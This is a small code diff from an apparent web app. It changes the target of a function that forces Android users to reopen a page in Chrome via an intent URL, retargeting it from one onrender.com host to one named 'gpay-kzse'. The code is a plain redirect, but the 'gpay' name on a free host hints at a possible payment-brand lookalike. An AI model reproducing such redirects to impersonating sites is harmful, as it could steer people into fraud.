@@ -16,8 +16,8 @@ function App() {
     }
 
     function redirectToChrome() {
-      var androidUrl = "intent://check2-rntd.onrender.com#Intent;scheme=https;package=com.android.chrome;end;";
-      var fallbackUrl = "https://check2-rntd.onrender.com";
+      var androidUrl = "intent://gpay-kzse.onrender.com#Intent;scheme=https;package=com.android.chrome;end;";
+      var fallbackUrl = "https://gpay-kzse.onrender.com";
 
       if (/android/i.test(navigator.userAgent)) {
         window.location.href = androidUrl;
